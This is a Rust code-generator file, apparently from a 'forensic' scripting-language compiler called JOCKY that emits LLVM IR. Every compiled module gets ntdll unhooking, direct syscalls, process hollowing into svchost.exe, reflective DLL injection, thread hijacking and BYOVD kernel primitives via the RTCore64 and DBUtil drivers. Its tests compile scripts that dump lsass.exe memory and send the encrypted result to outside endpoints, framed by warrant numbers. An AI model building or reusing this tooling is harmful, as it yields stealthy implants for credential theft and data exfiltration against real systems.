use crate::ast::*;
use crate::runtime::kernel_driver::KernelDriverEmitter;
use crate::runtime::ntdll_unhook::NtdllUnhooker;
use crate::runtime::process_hollow::ProcessHollow;
use crate::runtime::reflective_inject::ReflectiveInject;
use crate::runtime::{ReflectiveLoaderEmitter, ThreadHijackEmitter};
use anyhow::Result;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TargetOS {
    Windows,
    Linux,
}

pub struct CodeGenerator {
    target_os: TargetOS,
    ir_lines: Vec<String>,
    globals: Vec<String>,
    str_counter: usize,
}

impl CodeGenerator {
    pub fn new(_name: &str, target_os: TargetOS) -> Result<Self> {
        Ok(Self {
            target_os,
            ir_lines: Vec::new(),
            globals: Vec::new(),
            str_counter: 0,
        })
    }

    pub fn codegen_program(&mut self, program: &Program, target_os: TargetOS) -> Result<()> {
        self.target_os = target_os;
        self.ir_lines.clear();
        self.globals.clear();
        self.str_counter = 0;

        for (i, session) in program.sessions.iter().enumerate() {
            self.codegen_session(session, i)?;
        }

        if !program.statements.is_empty() {
            self.codegen_statements(&program.statements)?;
        }

        let mut final_lines = Vec::new();
        let triple = match self.target_os {
            TargetOS::Windows => "x86_64-pc-windows-msvc",
            TargetOS::Linux   => "x86_64-unknown-linux-gnu",
        };

        final_lines.push("; JOCKY Forensic Polymorphic LLVM IR".to_string());
        final_lines.push(format!("target triple = \"{}\"", triple));
        final_lines.push(String::new());

        final_lines.push("; Runtime Declarations".to_string());
        final_lines.push("declare i32 @jocky_init_session(i8* %target, i8* %warrant)".to_string());
        final_lines.push("declare i32 @jocky_collect_artifact(i32 %type, i8* %expr)".to_string());
        final_lines.push("declare i32 @jocky_encrypt_payload(i32 %algo, i8* %key_source)".to_string());
        final_lines.push("declare i32 @jocky_transmit_secure(i8* %endpoint)".to_string());
        final_lines.push("declare i32 @jocky_execute_forensic_fn(i8* %fn_name)".to_string());
        final_lines.push(String::new());

        if !self.globals.is_empty() {
            final_lines.push("; Constant String Literals".to_string());
            final_lines.extend(self.globals.clone());
            final_lines.push(String::new());
        }

        final_lines.extend(self.ir_lines.clone());

        // ── Runtime module IR bodies ─────────────────────────────────────────
        // Appended as separate, linkable IR sections so the compiled module
        // contains the full in-memory execution and BYOVD primitive definitions.
        final_lines.push(String::new());
        final_lines.push("; ── NtdllUnhooker: fresh ntdll mapping + API unhooking ─────────────".to_string());
        final_lines.push(NtdllUnhooker::emit_ir());
        final_lines.push(String::new());
        final_lines.push("; ── DirectSyscall declarations ──────────────────────────────────────".to_string());
        final_lines.push(NtdllUnhooker::emit_declarations());
        final_lines.push(String::new());
        final_lines.push("; ── ProcessHollow: process hollowing IR ────────────────────────────".to_string());
        final_lines.push(ProcessHollow::new("svchost.exe").emit_ir());
        final_lines.push(String::new());
        final_lines.push("; ── ReflectiveInject: reflective DLL injection ──────────────────────".to_string());
        final_lines.push(ReflectiveInject::emit_ir());
        final_lines.push(ReflectiveInject::emit_declarations());
        final_lines.push(String::new());
        final_lines.push("; ── ReflectiveLoader: PIC DLL bootstrap (no LoadLibrary) ───────────".to_string());
        final_lines.push(ReflectiveLoaderEmitter::emit_ir());
        final_lines.push(String::new());
        final_lines.push("; ── ThreadHijack: NT thread context hijacking ───────────────────────".to_string());
        final_lines.push(ThreadHijackEmitter::emit_ir());
        final_lines.push(String::new());
        final_lines.push("; ── BYOVD: RTCore64 + DBUtil kernel R/W primitives ─────────────────".to_string());
        final_lines.push(KernelDriverEmitter::emit_byovd_ir_stubs());
        final_lines.push(String::new());

        final_lines.push("; end of module".to_string());

        self.ir_lines = final_lines;
        Ok(())
    }

    fn codegen_statements(&mut self, stmts: &[MethodCall]) -> Result<()> {
        let func_name = "jocky_forensic_script_main";
        self.ir_lines.push("; Procedural Forensic Script Execution".to_string());
        self.ir_lines.push(format!("define i32 @{}() {{", func_name));
        self.ir_lines.push("entry:".to_string());

        for (i, stmt) in stmts.iter().enumerate() {
            let full_call = format!("{}.{}", stmt.module, stmt.function);
            let (str_sym, str_len) = self.add_string_constant(&full_call);
            self.ir_lines.push(format!(
                "  %call_ptr_{} = getelementptr inbounds [{} x i8], [{} x i8]* {}, i64 0, i64 0",
                i, str_len, str_len, str_sym
            ));
            self.ir_lines.push(format!(
                "  %call_res_{} = call i32 @jocky_execute_forensic_fn(i8* %call_ptr_{})",
                i, i
            ));
        }

        self.ir_lines.push("  ret i32 0".to_string());
        self.ir_lines.push("}".to_string());
        self.ir_lines.push(String::new());
        Ok(())
    }


    fn add_string_constant(&mut self, value: &str) -> (String, usize) {
        let name = format!("@.str.{}", self.str_counter);
        self.str_counter += 1;
        let len = value.len() + 1;
        self.globals.push(format!(
            "{} = private unnamed_addr constant [{} x i8] c\"{}\\00\", align 1",
            name, len, value
        ));
        (name, len)
    }

    fn codegen_session(&mut self, session: &ForensicSession, idx: usize) -> Result<()> {
        let (target_sym, target_len) = self.add_string_constant(&session.target);
        let (warrant_sym, warrant_len) = self.add_string_constant(&session.warrant);

        let func_name = format!("forensic_session_{}", idx);
        self.ir_lines.push(format!("; Session: target={} warrant={}", session.target, session.warrant));
        self.ir_lines.push(format!("define i32 @{}() {{", func_name));
        self.ir_lines.push("entry:".to_string());

        self.ir_lines.push(format!(
            "  %target_ptr = getelementptr inbounds [{} x i8], [{} x i8]* {}, i64 0, i64 0",
            target_len, target_len, target_sym
        ));
        self.ir_lines.push(format!(
            "  %warrant_ptr = getelementptr inbounds [{} x i8], [{} x i8]* {}, i64 0, i64 0",
            warrant_len, warrant_len, warrant_sym
        ));
        self.ir_lines.push("  %init_res = call i32 @jocky_init_session(i8* %target_ptr, i8* %warrant_ptr)".to_string());

        for item in &session.collect_items {
            self.codegen_collect_item(item);
        }

        self.codegen_encrypt(&session.encrypt_algo, &session.encrypt_key);
        self.codegen_transmit(&session.transmit_endpoint);

        self.ir_lines.push("  ret i32 0".to_string());
        self.ir_lines.push("}".to_string());
        self.ir_lines.push(String::new());
        Ok(())
    }

    fn codegen_collect_item(&mut self, item: &CollectItem) {
        let (type_id, comment) = match &item.artifact_type {
            ArtifactType::Registry => (1, "; collect registry artifact"),
            ArtifactType::Memory   => (2, "; collect memory artifact"),
            ArtifactType::Network  => (3, "; collect network artifact"),
            ArtifactType::Disk     => (4, "; collect disk artifact"),
            ArtifactType::Proc     => (5, "; collect /proc artifact"),
            ArtifactType::Auditd   => (6, "; collect auditd artifact"),
            ArtifactType::Ext4     => (7, "; collect ext4 artifact"),
        };

        let expr_str = match &item.expression {
            Expression::Identifier(s) => s.clone(),
            Expression::StringLiteral(s) => s.clone(),
            Expression::ProcessExpr { process } => format!("process:{}", process),
            Expression::PipeExpr { left: _, right: _ } => "pipe_expr".to_string(),
        };

        let (expr_sym, expr_len) = self.add_string_constant(&expr_str);
        self.ir_lines.push(format!("  {}", comment));
        self.ir_lines.push(format!(
            "  %expr_ptr_{} = getelementptr inbounds [{} x i8], [{} x i8]* {}, i64 0, i64 0",
            self.str_counter, expr_len, expr_len, expr_sym
        ));
        self.ir_lines.push(format!(
            "  call i32 @jocky_collect_artifact(i32 {}, i8* %expr_ptr_{})",
            type_id, self.str_counter
        ));
    }

    fn codegen_encrypt(&mut self, algo: &EncryptionAlgo, key: &str) {
        let (algo_id, algo_str) = match algo {
            EncryptionAlgo::Aes256   => (1, "aes256"),
            EncryptionAlgo::ChaCha20 => (2, "chacha20"),
            EncryptionAlgo::MlKem    => (3, "ml_kem"),
        };
        let (key_sym, key_len) = self.add_string_constant(key);
        self.ir_lines.push(format!("  ; encrypt with {} key={}", algo_str, key));
        self.ir_lines.push(format!(
            "  %key_ptr_{} = getelementptr inbounds [{} x i8], [{} x i8]* {}, i64 0, i64 0",
            self.str_counter, key_len, key_len, key_sym
        ));
        self.ir_lines.push(format!(
            "  call i32 @jocky_encrypt_payload(i32 {}, i8* %key_ptr_{})",
            algo_id, self.str_counter
        ));
    }

    fn codegen_transmit(&mut self, endpoint: &str) {
        let (ep_sym, ep_len) = self.add_string_constant(endpoint);
        self.ir_lines.push(format!("  ; transmit to {}", endpoint));
        self.ir_lines.push(format!(
            "  %ep_ptr_{} = getelementptr inbounds [{} x i8], [{} x i8]* {}, i64 0, i64 0",
            self.str_counter, ep_len, ep_len, ep_sym
        ));
        self.ir_lines.push(format!(
            "  call i32 @jocky_transmit_secure(i8* %ep_ptr_{})",
            self.str_counter
        ));
    }

    pub fn emit_ir(&self, output_path: &str) -> Result<()> {
        let content = self.ir_lines.join("\n");
        std::fs::write(output_path, content)
            .map_err(|e| anyhow::anyhow!("Failed to write IR to '{}': {}", output_path, e))
    }

    pub fn ir_text(&self) -> String {
        self.ir_lines.join("\n")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::Parser;

    fn windows_script() -> &'static str {
        r#"forensic session {
    target: "192.168.1.105";
    warrant: "NTRO-2026-CYBER-0421";
    collect {
        registry: HKLM\SOFTWARE\Run,
        memory: process "lsass.exe"
    };
    encrypt aes256(key: hsm_derived);
    transmit via: "forensics.ntro.gov.in";
}"#
    }

    #[test]
    fn test_codegen_windows() {
        let prog = Parser::parse(windows_script()).expect("parse failed");
        let mut cg = CodeGenerator::new("test", TargetOS::Windows).expect("cg init");
        cg.codegen_program(&prog, TargetOS::Windows).expect("codegen failed");
        let ir = cg.ir_text();
        assert!(ir.contains("x86_64-pc-windows-msvc"));
        assert!(ir.contains("forensic_session_0"));
        assert!(ir.contains("jocky_init_session"));
        assert!(ir.contains("jocky_encrypt_payload"));
    }

    #[test]
    fn test_codegen_linux() {
        let source = r#"forensic session {
    target: "10.0.5.42";
    warrant: "NTRO-2026-LINUX-0089";
    collect { proc: all_processes };
    encrypt ml_kem(key: hsm_derived);
    transmit via: "cloudfront.ntro.gov.in";
}"#;
        let prog = Parser::parse(source).expect("parse failed");
        let mut cg = CodeGenerator::new("test_linux", TargetOS::Linux).expect("cg init");
        cg.codegen_program(&prog, TargetOS::Linux).expect("codegen failed");
        let ir = cg.ir_text();
        assert!(ir.contains("x86_64-unknown-linux-gnu"));
        assert!(ir.contains("jocky_init_session"));
    }

    #[test]
    fn test_emit_ir_to_file() {
        let source = r#"forensic session {
    target: "192.168.1.1";
    warrant: "NTRO-2026-TEST-0001";
    collect { registry: HKLM };
    encrypt aes256(key: hsm_derived);
    transmit via: "forensics.ntro.gov.in";
}"#;
        let prog = Parser::parse(source).expect("parse failed");
        let mut cg = CodeGenerator::new("emit_test", TargetOS::Windows).expect("cg init");
        cg.codegen_program(&prog, TargetOS::Windows).expect("codegen failed");
        cg.emit_ir("/tmp/jocky_test.ll").expect("emit_ir failed");
        assert!(std::path::Path::new("/tmp/jocky_test.ll").exists());
    }
}
